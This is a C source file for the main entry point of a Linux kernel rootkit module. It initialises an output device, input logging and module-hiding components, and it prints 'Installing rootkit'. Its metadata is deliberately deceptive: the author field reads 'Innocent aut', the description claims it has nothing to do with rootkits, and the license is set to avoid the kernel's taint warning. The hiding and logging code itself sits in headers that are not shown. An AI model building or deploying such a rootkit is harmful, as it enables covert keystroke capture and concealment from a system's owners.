#include <linux/module.h>	 // For modules
#include <linux/kernel.h>	 // For KERN_INFO
#include <linux/init.h>	


#include "logInput.h"
#include "moduleHide.h"
#include "outputDevice.h"


static int __init main_init(void) {
	
	//panic();
	int error;
	
	// console_print("Hello, world - this is the kernel speaking\n") ;
	printk(KERN_INFO "Installing rootkit\n");

	error = outputDevice_init();
	if (error) return error;
	
	error = logInput_init();
	if (error) return error;
	
	error = moduleHide_init();
	if (error) return error;

	printk(KERN_INFO "Rootkit installed\n");
	return 0;
}

static void __exit main_exit(void) {
	int error;

	error = moduleHide_exit();
	if (error) return; // TOOD: warn about the error rather than return...
	
	error = logInput_exit();
	if (error) return;
	
	error = outputDevice_exit();
	if (error) return;

	printk(KERN_INFO "Rootkit uninstalled\n");
}



// Get rid of taint message
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Innocent aut");
MODULE_DESCRIPTION("This is a perfectly innocent module and has nothing to do with rootkits whatsoever :)");

module_init(main_init);
module_exit(main_exit);	 // For init macros
//#include <linux/tty.h> /* console_print() interface */
